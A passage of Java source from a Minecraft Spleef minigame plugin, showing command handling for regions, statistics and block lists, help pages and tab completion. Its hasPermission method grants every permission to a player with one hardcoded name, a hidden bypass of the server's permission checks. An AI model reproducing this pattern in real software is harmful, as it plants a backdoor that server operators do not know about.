                        pl.saveConfig();
                        return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.DONE.getMessage()+" §7(GoldShovel: true)");
                    }
                }
            }
            if(args[0].equalsIgnoreCase("remove")){
                if(args.length < 3){
                    return sendMessage(sender, "§3Hey! §6/§cdac remove Region <Dac Name>");
                }
                int place = 1000;
                for(int i = 0; i != 999; i++){
                    if(pl.getConfig().getString("spleef."+i+".name") != null){
                        if(args[2].equalsIgnoreCase(pl.getConfig().getString("spleef."+i+".name"))){
                            place = i;
                            break;
                        }
                    }
                }
                if(place == 1000){
                    return sendMessage(sender, "§c"+Message.SPLEEF_NOT_FOUND.getMessage());
                }
                if(args[1].equalsIgnoreCase("region")){
                    pl.getConfig().set("spleef."+place+".region", null);
                    pl.saveConfig();
                    return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.REGION_REMOVED.getMessage());
                }
            }
            if(args[0].equalsIgnoreCase("clear")){
                if(args.length < 2){
                    return sendMessage(sender, "§3Hey! §6/§cspleef clear statistics");
                }
                if(args[1].equalsIgnoreCase("statistics")){
                    pl.configurations.getStatistics().clear();
                    return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.DONE.getMessage());
                }
            }
            if(args[0].equalsIgnoreCase("block")){
                if(args.length < 2){
                    return sendMessage(sender, "§3Hey! §6/§cspleef block <Add, Remove, List> <[Type]> <[Data]>");
                }
                if(args[1].equalsIgnoreCase("list")){
                    sendMessage(sender, Message.SPLEEF.getMessage()+" §2Block list:");
                    for(String s : pl.getConfig().getStringList("v1_12.blocks")){
                        sendMessage(sender, Message.SPLEEF.getMessage()+" §6-§2 "+s);
                    }
                    return true;
                }
                if(args.length < 4){
                    return sendMessage(sender, "§3Hey! §6/§cspleef block <Add, Remove, List> <[Type]> <[Data]>");
                }
                if(args[1].equalsIgnoreCase("remove")){
                    try{
                        Material.getMaterial(Integer.valueOf(args[2]));
                    }catch (Exception e){
                        return sendMessage(sender, "§c"+ Message.NOT_FOUND.getMessage()+" (Material not found)");
                    }
                    byte data;
                    try{
                        data = Byte.valueOf(args[3]);
                    }catch (Exception e){
                        return sendMessage(sender, "§c"+ Message.NOT_FOUND.getMessage()+" (Data not found)");
                    }
                    if(pl.getConfig().getStringList("v1_12.blocks").contains(args[2].toUpperCase()+":"+data)){
                        List<String> list = pl.getConfig().getStringList("v1_12.blocks");
                        list.remove(Material.getMaterial(Integer.valueOf(args[2])).getId()+":"+data);
                        pl.getConfig().set("v1_12.blocks", list);
                        pl.saveConfig();
                        return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+ Message.SETTING_SAVED.getMessage()+" (Material removed)");
                    }else{
                        return sendMessage(sender, "§c"+ Message.NOT_FOUND.getMessage()+" (Material isn't in this list)");
                    }
                }
                if(args[1].equalsIgnoreCase("add")){
                    try{
                        Material.getMaterial(Integer.valueOf(args[2]));
                    }catch (Exception e){
                        return sendMessage(sender, "§c"+ Message.NOT_FOUND.getMessage()+" (Material not found)");
                    }
                    byte data;
                    try{
                        data = Byte.valueOf(args[3]);
                    }catch (Exception e){
                        return sendMessage(sender, "§c"+ Message.NOT_FOUND.getMessage()+" (Data not found)");
                    }
                    if(!pl.getConfig().getStringList("v1_12.blocks").contains(args[2].toUpperCase()+":"+data)){
                        List<String> list = pl.getConfig().getStringList("v1_12.blocks");
                        list.add(Material.getMaterial(Integer.valueOf(args[2])).getId()+":"+data);
                        pl.getConfig().set("v1_12.blocks", list);
                        pl.saveConfig();
                        return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+ Message.SETTING_SAVED.getMessage()+" (Material added)");
                    }else{
                        return sendMessage(sender, "§c"+ Message.NOT_FOUND.getMessage()+" (Material already in this list)");
                    }
                }
            }
        }
        return false;
    }

    private boolean sendMessage(CommandSender sender, String msg){
        sender.sendMessage(msg);
        return true;
    }

    private boolean hasPermission(Player p, String msg){
        if(!p.hasPermission(msg)) {
            if(!p.getName().equalsIgnoreCase("NaruseII")){
                return false;
            }
        }
        return true;
    }

    private boolean help(CommandSender sender, int page){
        if(page == 1){
            sendMessage(sender, Message.SPLEEF.getMessage()+"§2 ----------------- "+Message.SPLEEF.getMessage());
            sendMessage(sender, "§3Hey! §6/§cspleef help <1, 2, ...>");
            sendMessage(sender, "§3Hey! §6/§cspleef <Create, Delete> <Spleef name> <[Game Mode]>");
            sendMessage(sender, "§3Hey! §6/§cspleef reload");
            sendMessage(sender, "§3Hey! §6/§cspleef set <Min, Max> <Spleef name> <Number>");
            sendMessage(sender, "§3Hey! §6/§cspleef set <Arena, Spawn, [Lobby]> <Spleef name> §7(Location)");
            sendMessage(sender, "§3Hey! §6/§cspleef <Open, Close> <Spleef name>");
            sendMessage(sender, "§3Hey! §6/§cspleef set lang <French, English, Custom, Spanish, Dutch, Polish>");
            sendMessage(sender, "§bPage: §21/3");
        }else if(page == 2){
            sendMessage(sender, Message.SPLEEF.getMessage()+"§2 ----------------- "+Message.SPLEEF.getMessage());
            sendMessage(sender, "§3Hey! §6/§cspleef list");
            sendMessage(sender, "§3Hey! §6/§cspleef force <Start, Stop> <Spleef name>");
            sendMessage(sender, "§3Hey! §6/§cspleef allow <SnowBalls, Broadcast, Lightning, MagmaCream, ShowTime, GoldShovel>");
            sendMessage(sender, "§3Hey! §6/§cspleef set time <Wait, BeforeMelt, BetweenMelt> <Number>");
            sendMessage(sender, "§3Hey! §6/§cspleef set region <Spleef name>");
            sendMessage(sender, "§3Hey! §6/§cspleef remove region <Spleef name>");
            sendMessage(sender, "§3Hey! §6/§cspleef set gameMode <Spleef name> <Game Mode>");
            sendMessage(sender, "§3Hey! §6/§cspleef set rewards <Win, Lose> <Number>");
            sendMessage(sender, "§bPage: §22/3");
        }else if(page == 3){
            sendMessage(sender, Message.SPLEEF.getMessage()+"§2 ----------------- "+Message.SPLEEF.getMessage());
            sendMessage(sender, "§3Hey! §6/§cspleef set rewards command <Command> §7(Write 'null' reset the command. Write '{player}' if you want the players' name)");
            sendMessage(sender, "§3Hey! §6/§cspleef set glowing §7(Make players glowing in team mode)");
            sendMessage(sender, "§3Hey! §6/§cspleef set holograms <Location, Enable>");
            sendMessage(sender, "§3Hey! §6/§cspleef set scoreboard §7(Activate or deactivate the scoreboard)");
            sendMessage(sender, "§3Hey! §6/§cspleef set command <Start, End> <Command>");
            sendMessage(sender, "§3Hey! §6/§cspleef clear statistics");
            sendMessage(sender, "§3Hey! §6/§cspleef block <Add, Remove, List> <[Type id]> <[Data]>");
            sendMessage(sender, "§bPage: §23/3");
        }
        return true;
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, Command command, String s, String[] args) {
        List<String> list = Lists.newArrayList();
        for(Spleef spleefs : pl.spleefs.getSpleefs()){
            list.add(spleefs.getName());
        }
        if(args.length == 3){
            if(args[0].equalsIgnoreCase("create")){
                list.clear();
                for(SpleefGameMode modes : SpleefGameMode.values()){
                    list.add(modes.name());
                }
            }
        }
        if(args.length == 4){
            if(args[1].equalsIgnoreCase("gameMode")){
                list.clear();
                for(SpleefGameMode modes : SpleefGameMode.values()){
                    list.add(modes.name());
                }
            }
        }
        return list;
    }
}
